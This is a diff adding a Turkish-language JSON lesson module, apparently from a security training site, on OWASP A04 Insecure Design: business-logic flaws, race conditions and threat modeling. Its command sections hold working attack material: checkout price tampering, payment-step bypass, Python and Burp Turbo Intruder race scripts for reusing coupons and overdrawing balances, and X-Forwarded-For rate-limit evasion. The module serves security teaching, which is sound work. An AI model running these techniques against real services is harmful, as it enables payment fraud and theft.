@@ -1,0 +1,80 @@
+{
+  "id": "insecure-design",
+  "slug": "insecure-design",
+  "title": "A04 — Insecure Design",
+  "subtitle": "Güvensiz Tasarım ve İş Mantığı Hataları",
+  "description": "Tasarım aşamasında güvenlik düşünülmemesi. Business logic bypass, rate limit atlatma, race condition, threat modeling eksikliği.",
+  "icon": "📐",
+  "order": 4,
+  "tags": ["business logic", "rate limit bypass", "race condition", "threat modeling", "tasarım açığı"],
+  "modules": [
+    {
+      "id": "design-intro",
+      "title": "Güvensiz Tasarım Nedir?",
+      "description": "Kod değil, mimari seviyesindeki güvenlik sorunları",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Insecure Design vs Misconfiguration",
+          "content": "**Insecure Design:** Tasarım ve mimari aşamasında güvenlik gereksinimlerinin göz ardı edilmesi. Kod doğru çalışıyor ama iş mantığı güvensiz.\n\n**Fark:**\n- **Misconfiguration:** Doğru tasarlanmış bir sistemin hatalı yapılandırılması → düzeltilebilir\n- **Insecure Design:** Temel mimari kararlar güvensiz → yeniden tasarım gerektirir\n\n**Örnek Senaryolar:**\n\n1. **Rate limit yok:** Şifre sıfırlama OTP → sınırsız deneme → brute force\n\n2. **Business logic bypass:** Premium içeriğe ücretsiz erişim\n   - Ödeme sayfasını atla → doğrudan onay URL'ine git\n\n3. **Güvensiz parola kurtarma:**\n   - \"Annenin kızlık soyadı?\" → sosyal medyadan bulunabilir\n\n4. **Race condition:** Aynı anda 2 istek → bakiye kontrolü ikisini de geçiriyor\n\n5. **İstemci tarafı kontrol:** Fiyat, JS'de değiştirilebiliyor\n\n**Threat Modeling:**\nGüvenli tasarım için: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)"
+        }
+      ]
+    },
+    {
+      "id": "business-logic",
+      "title": "Business Logic Bypass",
+      "description": "İş mantığı hatalarını istismar etme",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "İş Mantığı Saldırıları",
+          "commands": [
+            {
+              "command": "# Fiyat manipülasyonu — istemci tarafında fiyat:\n# Sepete ekle, ödeme isteğini Burp ile yakala:\n# POST /checkout\n# {\"item_id\": 123, \"price\": 99.99, \"qty\": 1}\n\n# Fiyatı değiştir:\n# {\"item_id\": 123, \"price\": 0.01, \"qty\": 1}\n# veya negatif:\n# {\"item_id\": 123, \"price\": -50.00, \"qty\": 1}  # para ekleniyor!\n\n# Sunucu fiyatı istemciden alıyorsa → satın al!",
+              "description": "Fiyat manipülasyonu — sepet/ödeme API'sinde fiyat kontrolü",
+              "tip": "Fiyat her zaman sunucu tarafında hesaplanmalı, istemciden gelen fiyat kesinlikle güvenilmemeli"
+            },
+            {
+              "command": "# Ödeme adımı bypass (multi-step workflow):\n# Normal akış: /cart → /payment → /confirm → /success\n\n# Bypass dene:\n# 1. /cart → doğrudan /success?order_id=123\n# 2. /payment adımını atla\n# Eğer /success sonucu kontrol etmiyorsa sipariş oluşabilir!\n\n# Burp ile test:\n# Ödemeyi tamamla ama son adımda response değiştir:\n# {\"payment_status\": \"FAILED\"} → {\"payment_status\": \"SUCCESS\"}",
+              "description": "Çok adımlı iş akışı bypass"
+            },
+            {
+              "command": "# Kupon kodu sınırsız kullanım:\n# Normal: bir kupon bir kez kullanılabilir\n# Hata: race condition → aynı anda 2 istek gönder\n\npython3 << 'EOF'\nimport requests, threading\n\ncookies = {'session': 'SENIN_SESSION'}\nurl = 'https://hedef.com/apply-coupon'\ndata = {'code': 'DISCOUNT50'}\n\ndef apply_coupon():\n    r = requests.post(url, data=data, cookies=cookies)\n    print(r.json())\n\n# Aynı anda 10 istek gönder:\nthreads = [threading.Thread(target=apply_coupon) for _ in range(10)]\nfor t in threads: t.start()\nfor t in threads: t.join()\nEOF",
+              "description": "Race condition ile kupon/hediye sınırsız kullanım"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "race-condition",
+      "title": "Race Condition",
+      "description": "Eş zamanlı isteklerle iş mantığını atlatma",
+      "difficulty": "advanced",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Race Condition Saldırıları",
+          "commands": [
+            {
+              "command": "# Burp Suite ile race condition (Turbo Intruder):\n# Senaryó: Bakiye kontrolü ve para gönderme aynı anda\n# Normal: 100 TL bakiye, 100 TL gönder → 0 TL kalır\n# Race: Aynı anda 5 kez gönder → hepsi 100 TL kontrolü geçerse = 500 TL gönderildi!\n\n# Burp Turbo Intruder (Python script):\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                          concurrentConnections=20,\n                          requestsPerConnection=1,\n                          pipeline=False)\n    for i in range(20):\n        engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    table.add(req)",
+              "description": "Burp Turbo Intruder ile race condition saldırısı"
+            },
+            {
+              "command": "# Rate limit bypass teknikleri:\n# 1. X-Forwarded-For ile IP değiştir:\ncurl -X POST https://hedef.com/forgot-password \\\n  -H 'X-Forwarded-For: 1.1.1.1' \\\n  -d 'email=hedef@mail.com'\n\n# 2. Farklı User-Agent:\n# 3. Endpoint variation: /api/v1/ vs /API/v1/ vs /api/V1/\n\n# 4. HTTP/2 Stream Racing (Burp Suite):\n# Tek TCP bağlantısında birden fazla istek → sunucu aynı anda işler",
+              "description": "Rate limit bypass teknikleri"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
